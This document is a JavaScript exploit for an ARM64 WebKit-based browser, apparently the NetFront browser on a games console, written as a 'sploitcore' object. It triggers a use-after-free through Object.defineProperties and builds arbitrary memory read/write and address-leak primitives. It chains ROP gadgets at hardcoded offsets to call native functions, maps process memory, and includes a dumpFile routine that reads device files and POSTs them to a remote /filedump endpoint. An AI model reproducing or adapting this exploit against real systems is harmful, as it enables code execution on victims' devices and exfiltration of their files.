var DEBUG = false;

function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		send('log', msg);
	}
};
var log = console.log;
function dlog(msg) {
	if(DEBUG)
		log(msg);
}
window.onerror = function(msg, url, line) {
	send('error', [line, msg]);
	location.reload();
};

log('Loaded');

function paddr(lo, hi) {
	if(arguments.length == 1) {
		hi = lo[1];
		lo = lo[0];
	}
	var slo = ('00000000' + lo.toString(16)).slice(-8);
	var shi = ('00000000' + hi.toString(16)).slice(-8);
	return '0x' + shi + slo;
}
function nullptr(addr) {
	return addr[0] == 0 && addr[1] == 0;
}
function eq(a, b) {
	return a[0] == b[0] && a[1] == b[1];
}
function add2(addr, off) {
	if(typeof(off) == 'number')
		off = [off, 0];

	var alo = addr[0], ahi = addr[1];
	var blo = off[0], bhi = off[1];

	var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
	var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;

	if((nlo < alo && blo > 0) || (nlo == alo && blo != 0)) {
		nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
	} else if(nlo > alo && blo < 0) {
		nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
	}

	return [nlo, nhi];
}
function offset32(addr, off) {
	return add(addr, off * 4);
}

var sploitcore = function() {
	this.rwbuf = new ArrayBuffer(0x1003 * 4);
	this.tu = new Uint32Array(this.rwbuf);
	for(var i = 0; i < this.tu.length; ++i)
		this.tu[i] = 0x41424344;

	var numbufs = 1000000;
	this.bufs = new Array(numbufs);

	this.allocated = {};

	var bufi = this.setup();
	if(bufi == -1) {
		log('~~failed');
		this.bufs = 0;
		throw 'Failed.';
	}

	this.buf = this.bufs[bufi];

	this.func = document.getElementById;
	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
	this.funcaddr = null;
	this.funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module

	this.leakee = {'b' : null};
	var leaker = {'a' : this.leakee};

	this.stale[1] = leaker;
	var leaklo = this.buf[4], leakhi = this.buf[5];
	this.stale[1] = this.temp;
	this.leakaddr = [leaklo, leakhi];

	var taddr = this.getAddr(this);
	var saddr = this.getAddr(this.stale);
	var found = false;
	for(var i = 0; i < 0x1000; i += 2) {
		if(eq(this.read8(taddr, i), saddr)) {
			found = true;
			this.write8([0x00000000, 0xffff0000], taddr, i);
			break;
		}
	}
	if(!found)
		throw 'Could not find this.stale';

	this.clearBuffers(bufi);

	this.mainaddr = this.walkList();
	dlog('Main address ' + paddr(this.mainaddr));
};

sploitcore.prototype.allocBuffers = function() {
	dlog('Making ' + this.bufs.length + ' buffers');
	for(var i = 0; i < this.bufs.length; ++i)
		this.bufs[i] = new Uint32Array(this.rwbuf);
};

sploitcore.prototype.setup = function() {
	var self = this;
	log('Starting');

	var first = true;
	var arr = new Array(0x100);
	var tbuf = new ArrayBuffer(0x1000);
	arr[0] = tbuf;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;

		if(first) {
			self.allocBuffers();
			first = false;
		}

		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	this.stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	this.stale = target.stale;

	dlog('Checking if triggered...');
	if(this.stale.length == before_len) {
		log('Failed to overwrite array');
		return -1;
	}

	dlog('Triggered.  New length: 0x' + this.stale.length.toString(16));

	if(this.stale.length < 2 || this.stale.length == 0x1003) {
		log('Bad length');
		return -1;
	}

	this.temp = new Uint32Array(0x10);
	this.stale[1] = this.temp;

	dlog('Looking for buf...');

	for(var i = 0; i < this.bufs.length; ++i) {
		if(this.bufs[i][0] != 0x41424344) {
			return i;
		}
	}

	log('Buffer not found');
	return -1;
};

sploitcore.prototype.clearBuffers = function(bufi) {
	var kg = new Uint32Array(8);
	var tuaddr = this.getAddr(this.tu);
	for(var i = 0; i < 8; ++i)
		kg[i] = this.read4(tuaddr, i);

	dlog('Clearing useless buffers');
	for(var i = 0; i < this.bufs.length; ++i) {
		if(i != bufi)
			this.bufs[i] = 0;
	}
	dlog('Done with cleanup.');
}

sploitcore.prototype.dump = function(name, buf, count) {
	for(var j = 0; j < count; ++j)
		log(name + '[' + j + '] == 0x' + buf[j].toString(16));
};
sploitcore.prototype.dumpbuf = function(count) {
	this.dump('Buf', this.buf, count);
};
sploitcore.prototype.dumptemp = function(count) {
	this.dump('Tem', this.temp, count);
};
sploitcore.prototype.dumpaddr = function(addr, count) {
	this.buf[4] = addr[0];
	this.buf[5] = addr[1];
	this.buf[6] = count;
	this.dumptemp(count);
};

sploitcore.prototype.read4 = function(addr, offset) {
	if(arguments.length == 1)
		offset = 0;
	this.buf[4] = addr[0];
	this.buf[5] = addr[1];
	this.buf[6] = 1 + offset;

	return this.temp[offset];
};
sploitcore.prototype.write4 = function(val, addr, offset) {
	if(arguments.length == 2)
		offset = 0;
	this.buf[4] = addr[0];
	this.buf[5] = addr[1];
	this.buf[6] = 1 + offset;

	this.temp[offset] = val;
};
sploitcore.prototype.read8 = function(addr, offset) {
	if(arguments.length == 1)
		offset = 0;
	return [this.read4(addr, offset), this.read4(addr, offset + 1)];
};
sploitcore.prototype.write8 = function(val, addr, offset) {
	if(arguments.length == 2)
		offset = 0;
	this.write4(val[0], addr, offset);
	this.write4(val[1], addr, offset + 1);
};
sploitcore.prototype.getAddr = function(obj) {
	this.leakee['b'] = {'a' : obj};
	return this.read8(this.read8(this.leakaddr, 4), 4);
};
sploitcore.prototype.getAddrDestroy = function(obj) {
	this.leakee['b'] = {'a' : obj};
	var addr = this.read8(this.read8(this.leakaddr, 4), 4);
	// Salt the earth.  No object shall ever grow here again.
	this.write8([0x00000000, 0xffff0000], this.read8(this.leakaddr, 4), 4);
	//this.write8([0x00000000, 0xffff0000], this.leakaddr, 4);
	this.leakee['b'] = 0;
	return addr;
};
sploitcore.prototype.mref = function(off) {
	return add2(this.mainaddr, off);
};

sploitcore.prototype.getBase = function() {
	var tlfuncaddr = this.getAddr(this.func);
	this.funcaddr = this.read8(tlfuncaddr, 6);

	var baseaddr = add2(this.read8(this.funcaddr, 8), -this.funcbase);

	dlog('First module ... ' + paddr(baseaddr));

	return baseaddr;
};

sploitcore.prototype.walkList = function() {
	var addr = this.getBase();
	dlog('Initial NRO at ' + paddr(addr));

	while(true) {
		var baddr = addr;

		var modoff = this.read4(addr, 1);
		addr = add2(addr, modoff);
		var modstr = this.read4(addr, 6);
		addr = add2(addr, modstr);

		// Read next link ptr
		addr = this.read8(addr);
		if(nullptr(addr)) {
			log('Reached end');
			break;
		}

		var nro = this.read8(addr, 8);

		if(nullptr(nro)) {
			dlog('Hit RTLD at ' + paddr(addr));
			addr = this.read8(addr, 4);
			break;
		}

		if(this.read4(nro, 4) != 0x304f524e) {
			log('Something is wrong.  No NRO header at base.');
			break;
		}

		addr = nro;
		dlog('Found NRO at ' + paddr(nro));
	}

	while(true) {
		var nro = this.read8(addr, 8);
		if(nullptr(nro)) {
			dlog('Hm, hit the end of things.  Back in rtld?');
			return;
		}

		if(this.read4(nro, this.read4(nro, 1) >> 2) == 0x30444f4d) {
			dlog('Got MOD at ' + paddr(nro));
			if(this.read4(nro, 4) == 0x8DCDF8 && this.read4(nro, 5) == 0x959620) {
				dlog('Found main module.');
				return nro;
			}
		} else {
			dlog('No valid MOD header.  Back at RTLD.');
			break;
		}

		addr = this.read8(addr, 0);
		if(nullptr(addr)) {
			dlog('End of chain.');
			break;
		}
	}
};

sploitcore.prototype.getSP = function() {
	/*
		First gadget: hijack X8 via ADRP and known PC, load X2 from known address and branch there
	
		.text:000000000039FEEC 08 2C 00 90                 ADRP            X8, #qword_91F320@PAGE ; Address of Page
		.text:000000000039FEF0 08 81 0C 91                 ADD             X8, X8, #qword_91F320@PAGEOFF ; Rd = Op1 + Op2
		.text:000000000039FEF4 02 05 40 F9                 LDR             X2, [X8,#(qword_91F328 - 0x91F320)] ; Load from Memory
		.text:000000000039FEF8 40 00 1F D6                 BR              X2      ; Branch To Register
	*/
	/*
		Second gadget: assuming known X8, grab X9 value, leak SP via X24, and branch to X9
	
		.text:00000000003E2724                 LDR             X9, [X8,#0x30]
		.text:00000000003E2728                 MOV             X8, SP
		.text:00000000003E272C                 MOV             X0, X23
		.text:00000000003E2730                 MOV             X24, SP
		.text:00000000003E2734                 BLR             X9
	*/
	var test = 0x39FEEC; // First gadget addr
	var jaddr = add2(this.mainaddr, test);
	dlog('New jump at ' + paddr(jaddr));
	dlog('Assigning function pointer');

	dlog('Function object at ' + paddr(this.funcaddr));
	var curptr = this.read8(this.funcaddr, 8);

	var fixed = this.mref(0x91F320);
	var saved = new Uint32Array(30);
	for(var i = 0; i < saved.length; ++i)
		saved[i] = this.read4(fixed, i);
	
	var retaddr = this.mref(0x3E2724); // Second gadget addr
	var memaddr = this.mref(0x91F328);
	this.write8(retaddr, memaddr);
	retaddr = this.mref(0x181E9C); // Last gadget addr (should just be `blr X27`)
	memaddr = this.mref(0x91F350);
	this.write8(retaddr, memaddr);

	// For addresses in webkit_wkc
	//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);

	// For addresses in app
	this.write8(jaddr, this.funcaddr, 8);

	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));

	dlog('Assigned.  Jumping.');
	var sp = this.getAddrDestroy(this.func.apply(0x101));
	dlog('Jumped back.');

	dlog('Got stack pointer: ' + paddr(sp));

	this.write8(curptr, this.funcaddr, 8);

	dlog('Restored original function pointer.');
	for(var i = 0; i < saved.length; ++i)
		this.write4(saved[i], fixed, i);
	dlog('Restored data page.');

	return sp;
};

sploitcore.prototype.malloc = function(bytes) {
	var obj = new Uint32Array(bytes >> 2);
	var addr = this.read8(this.getAddr(obj), 4);
	this.allocated[addr] = obj;
	return addr;
};
sploitcore.prototype.free = function(addr) {
	this.allocated[addr] = 0;
};

sploitcore.prototype.call = function(funcptr, args, registers) {
	if (typeof(funcptr) == 'number') {
		funcptr = add2(this.mainaddr, funcptr);
	}
	if (arguments.length == 2) {
		registers = [];
	} else if (arguments.length == 1) {
		registers = [];
		args = [];
	} 
	var sp = this.getSP();

	dlog('Starting holy rop');
	var jaddr = this.mref(0x39FEEC); // First gadget addr
	dlog('New jump at ' + paddr(jaddr));
	dlog('Assigning function pointer');

	dlog('Function object at ' + paddr(this.funcaddr));
	var curptr = this.read8(this.funcaddr, 8);
	this.write8(jaddr, this.funcaddr, 8);
	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));

	dlog('Setting up structs');

	var fixed = this.mref(0x91F320);
	var saved = new Uint32Array(12);
	for(var i = 0; i < saved.length; ++i)
		saved[i] = this.read4(fixed, i);

	// Begin Gadgets
	var gadg2 = this.mref(0x4967F0);
	var gadg3 = this.mref(0x433EB4);
	var gadg4 = this.mref(0x1A1C98);
	var gadg5 = this.mref(0x3C2314);
	var returngadg = this.mref(0x181E9C);

	var savegadg = this.mref(0x4336B0);
	var loadgadg = this.mref(0x433620);
	var loadgadg_stage2 = this.mref(0x3A8688);

	var ropgadg2 = this.mref(0x582AE8);
	var ropgadg3 = this.mref(0x182444);
	var ropgadg4 = this.mref(0x3A278C);
	// End Gadgets

	var context_load_struct = this.malloc(0x200);
	var block_struct_1 = this.malloc(0x200);
	var block_struct_2 = this.malloc(0x200);
	var savearea = this.malloc(0x400);
	var loadarea = this.malloc(0x400);

	this.write8(context_load_struct, fixed, 0x00 >> 2);
	this.write8(gadg2, fixed, 0x08 >> 2);
	this.write8(gadg3, fixed, 0x10 >> 2);
	this.write8(gadg2, fixed, 0x18 >> 2);
	this.write8(block_struct_1, fixed, 0x28 >> 2);

	sp = add2(sp, -0x8030);
	this.write8(gadg4, context_load_struct, 0x58 >> 2);
	this.write8(sp, context_load_struct, 0x68 >> 2);
	this.write8(returngadg, context_load_struct, 0x158 >> 2);
	this.write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);

	this.write8(savearea, block_struct_1, 0x0 >> 2);
	this.write8(gadg5, block_struct_1, 0x10 >> 2);
	this.write8(gadg2, block_struct_1, 0x18 >> 2);
	this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
	this.write8(savegadg, block_struct_1, 0x38 >> 2);

	this.write8(gadg4, sp, 0x28 >> 2);

	sp = add2(sp, 0x30);

	this.write8(loadarea, block_struct_2, 0x00 >> 2);
	this.write8(loadgadg, block_struct_2, 0x10 >> 2);

	this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
	this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
	this.write8(funcptr, loadarea, 0x00 >> 2); 

	// Write registers for native code.
	if (registers.length > 9) {
		for (var i = 9; i < 30 && i < registers.length; i++) {
			this.write8(registers[i], loadarea, (8 * i) >> 2);
		}
	}

	// TODO: Loading in Q0-Q7 from SP[0:0x80] here, if we want it.

	if (registers.length > 0) {
		for (var i = 0; i <= 8 && i < registers.length; i++) {
			this.write8(registers[i], sp, (0x80 + 8 * i) >> 2);
		}

		if (registers.length > 19) {
			this.write8(registers[19], sp, 0xC8 >> 2);
		}

		if (registers.length > 29) {
			this.write8(registers[29], sp, 0xD0 >> 2);
		}
	}

	if (args.length > 0) {
		for (var i = 0; i < args.length && i < 8; i++) {
			this.write8(args[i], sp, (0x80 + 8 * i) >> 2)
		}
	}

	this.write8(ropgadg2, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop

	// Stack arguments would be bottomed-out at sp + 0xE0...
	// TODO: Stack arguments support. Would just need to figure out how much space they take up
	// and write ROP above them. Note: the user would have to call code that actually used
	// that many stack arguments, or shit'd crash.

	this.write8(add2(savearea, 0xB8), sp, 0xE8 >> 2);
	this.write8(ropgadg3, sp, 0xF8 >> 2);
	this.write8(ropgadg4, sp, 0x118 >> 2);
	this.write8(add2(sp, 0x8000), sp, 0x128 >> 2);
	this.write8(ropgadg2, sp, 0x138 >> 2);
	this.write8(add2(savearea, 0xF0), sp, 0x148 >> 2);
	this.write8(ropgadg3, sp, 0x158 >> 2);
	this.write8(ropgadg4, sp, 0x178 >> 2);
	this.write8(returngadg, sp, 0x188 >> 2);
	this.write8(ropgadg2, sp, 0x198 >> 2);
	this.write8(add2(savearea, 0xF8), sp, 0x1A8 >> 2);
	this.write8(ropgadg3, sp, 0x1B8 >> 2);
	this.write8(ropgadg4, sp, 0x1D8 >> 2);
	this.write8(savearea, sp, 0x1E8 >> 2);
	this.write8(loadgadg, sp, 0x1F8 >> 2);

	sp = add2(sp, 0x8000);

	dlog('Assigned.  Jumping.');
	var ret = this.getAddrDestroy(this.func.apply(0x101));
	dlog('Jumped back.');

	this.write8(curptr, this.funcaddr, 8);

	dlog('Restored original function pointer.');

	for(var i = 0; i < saved.length; ++i)
		this.write4(saved[i], fixed, i);
	dlog('Restored data page.');

	dlog('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));

	this.free(context_load_struct);
	this.free(block_struct_1);
	this.free(block_struct_2);
	this.free(savearea);
	this.free(loadarea);
	return ret;
};

sploitcore.prototype.querymem = function(addr, raw) {
	if(arguments.length == 1)
		raw = false;
	var meminfo = this.malloc(0x20);
	var pageinfo = this.malloc(0x8);
	var svcQueryMemory = 0x3BBE48;

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['FREE', 'RESERVED', 'IO', 'STATIC', 'CODE', 'PRIVATE', 'SHARED', 'CONTINUOUS', 'ALIASED', 'ALIAS', 'ALIAS CODE', 'LOCKED'];
	this.call(svcQueryMemory, [meminfo, pageinfo, addr]);

	var ms = this.read8(meminfo, 0x10 >> 2);
	if(!raw && ms[1] == 0 && ms[0] < memstates.length)
		ms = memstates[ms[0]];
	else if(!raw)
		ms = 'UNKNOWN'
	var mp = this.read8(meminfo, 0x18 >> 2);
	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
		mp = memperms[mp[0]];

	var data = [this.read8(meminfo, 0 >> 2), this.read8(meminfo, 0x8 >> 2), ms, mp, this.read8(pageinfo, 0 >> 2)];

	this.free(meminfo);
	this.free(pageinfo);

	return data;
};

sploitcore.prototype.str2buf = function(str) {
	var buf = this.malloc(str.length + 8);
	// Shitty memcpy of the string into buffer
	for (var i = 0; i < 0x100 && i < str.length; i += 4) {
		var val = 0;
		for (var j = 0; j < 4 && i + j < str.length; j++) {
			val |= (str.charCodeAt(i+j) & 0xFF) << (8 * j);
		}
		this.write4(val, buf, i >> 2);
	}
	if (str.length % 4 == 0) {
		this.write4(0, buf, str.length >> 2);
	}

	return buf;
};

sploitcore.prototype.getFileSize = function(fhandle) {
	var fseek = this.bridge(0x438B18, null, void_p, int, int);
	var ftell = this.bridge(0x438BE0, int);

	fseek(fhandle, 0, 2);
	var fsize = ftell(fhandle);
	fseek(fhandle, 0, 0);

	return fsize;
};

sploitcore.prototype.dumpFile = function(fn) {
	var fopen = this.bridge(0x43DDB4, void_p, char_p, char_p);
	var fread = this.bridge(0x438A14, int, void_p, int, int, void_p);

	var fhandle = fopen(fn, 'r');
	if (!nullptr(fhandle)) {
		var fsize = this.getFileSize(fhandle);
		var ofs = 0;
		var arr = new ArrayBuffer(0x800000);
		var int8view = new Uint8Array(arr);
		var outbuf = this.read8(this.getAddr(int8view), 4);
		var sz = fsize[0]; // XXX: Add primitive for converting our double-uint32 arrays into numbers
		while (sz > 0) {
			if (sz < 0x800000) {
				arr = new ArrayBuffer(sz);
				int8view = new Uint8Array(arr);
				outbuf = this.read8(this.getAddr(int8view), 4);
			}
			fread(outbuf, 1, sz < 0x800000 ? sz : 0x800000, fhandle);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', fn);
			xhr.send(int8view);
			xhr = null;
			sz -= 0x800000;
		}
		log(fn + ' is ' + paddr(fsize) + ' bytes.');
	} else {
		log('Failed to open file '+ fn + '!');
	}
};

sploitcore.prototype.bridge = function(ptr, rettype) {
	if(typeof(ptr) == 'number')
		ptr = add2(this.mainaddr, ptr);
	var self = this;
	var args = Array.prototype.slice.call(arguments, [2]);
	
	var sub = function() {
		if(arguments.length != args.length)
			throw 'Mismatched argument counts';

		var nargs = [];
		for(var i = 0; i < args.length; ++i) {
			var inp = arguments[i], type = args[i], v;
			switch(type) {
				case int: case void_p:
					if(typeof(inp) == 'number')
						v = [inp, 0];
					else
						v = inp;
					break;
				case char_p:
					inp = Array.prototype.map.call(inp, function(x) { return x.charCodeAt(0); });
					var len = inp.length + 1;
					if(len % 4 != 0)
						len += 4 - (len % 4);
					v = self.malloc(len);
					for(var i = 0; i < len; i += 4) {
						var a = inp.length > i+0 ? inp[i+0] : 0, b = inp.length > i+1 ? inp[i+1] : 0;
						var c = inp.length > i+2 ? inp[i+2] : 0, d = inp.length > i+3 ? inp[i+3] : 0;
						self.write4((d << 24) | (c << 16) | (b << 8) | a, v, i >> 2);
					}
					break;
			}
			nargs.push(v);
		}

		var retval = self.call(ptr, nargs);

		for(var i = 0; i < args.length; ++i) {
			var na = nargs[i], type = args[i];
			switch(type) {
				case char_p:
					self.free(na);
					break;
			}
		}

		return retval; // XXX: Do type processing
	};

	sub.addr = ptr;

	return sub;
};

var int = 'int', char_p = 'char*', void_p = 'void*';

function main() {
	var sc = new sploitcore();

	/*var str = 'this is a test string of length 0x25!';

	var strlen = sc.bridge(0x43A6E8, int, char_p);
	log(paddr(strlen(str)));

	sc.querymem(strlen.addr);*/

	var addr = [0, 0];
	last = [0, 0];
	while(true) {
		var mi = sc.querymem(addr);
		last = addr;
		addr = add2(mi[0], mi[1]);
		log(paddr(mi[0]) + ' - ' + paddr(addr) + '  ' + mi[2] + ' ' + mi[3]);
		if(addr[1] < last[1]) {
			log('End');
			break;
		}
	}
	
	//folders
	//sc.dumpFile('shareddata:/');
	//sc.dumpFile('oceanShared:/');
	//sc.dumpFile('shareddata:/webdatabase');
	//sc.dumpFile('shareddata:/browser/emoji');
	//sc.dumpFile('shareddata:/browser/page');
	
	//files
	//sc.dumpFile('shareddata:/buildinfo/buildinfo.dat');
	//sc.dumpFile('shareddata:/browser/Skin.dat');
	//sc.dumpFile('shareddata:/browser/MediaControls.css');
	//sc.dumpFile('shareddata:/browser/MediaControls.js');
	//sc.dumpFile('shareddata:/browser/ErrorPageTemplate.html');
	//sc.dumpFile('shareddata:/browser/ErrorPageSubFrameTemplate.html');
	//sc.dumpFile('shareddata:/browser/ErrorPageFilteringTemplate.html');
	//sc.dumpFile('shareddata:/browser/UserCss.dat');
	//sc.dumpFile('shareddata:/browser/RootCaSdk.pem');
	//sc.dumpFile('shareddata:/browser/RootCaEtc.pem');
	//sc.dumpFile('shareddata:/browser/effective_tld_names.dat');
	//sc.dumpFile('shareddata:/.nrr/netfront.nrr');
	//sc.dumpFile('shareddata:/dll/peer_wkc.nro');
	//sc.dumpFile('shareddata:/dll/oss_wkc.nro');
	//sc.dumpFile('shareddata:/dll/cairo_wkc.nro');
	//sc.dumpFile('shareddata:/dll/libfont.nro');
	//sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
	//sc.dumpFile('data:/sound/cruiser.bfsar');
}
